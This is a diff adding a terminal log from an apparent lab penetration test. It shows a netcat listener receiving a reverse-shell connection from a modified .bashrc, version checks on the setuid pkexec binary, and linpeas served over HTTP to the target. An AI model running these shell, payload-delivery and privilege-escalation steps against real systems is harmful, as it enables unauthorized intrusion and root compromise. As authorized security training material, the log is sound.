@@ -1,0 +1,40 @@
+[23:40:56] dele@kali:~$ nc -nvlp 9002
+listening on [any] 9002 ...
+connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 40754
+Welcome, dele! You’ve successfully modified the .bashrc file!
+
+[23:41:28] dele@vbox:~$ dpkg -S /usr/bin/pkexec
+pkexec: /usr/bin/pkexec
+
+[00:19:18] dele@vbox:~$ dpkg -l pkexec
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+||/ Name            Version      Architecture Description
++++-==============-============-============-======================================================
+ii  pkexec          0.105-33      amd64        run commands as another user with polkit authorization
+
+[00:19:24] dele@vbox:~$ ls -l /usr/bin/pkexec
+-rwsr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
+[02:27:37] dele@vbox:~$ /usr/bin/pkexec --version
+pkexec version 0.105
+
+
+---
+
+
+[11:15:19] dele@kali:~/securebank-penetration-test$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.56.103 - - [08/Dec/2025 11:40:19] "GET /linpeas.sh HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+
+[11:39:20] dele@kali:~/securebank-penetration-test$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+...
+Length: 971926 (949K) [application/octet-stream]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh              100%[=============================>] 949.15K   790KB/s     in 1.2s  
+
+2025-12-08 11:39:35 (790 KB/s) - ‘linpeas.sh’ saved [971926/971926]
+
+[12:16:58] dele@kali:~/securebank-penetration-test$ sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" linpeas_output.txt > linpeas_clean.txt
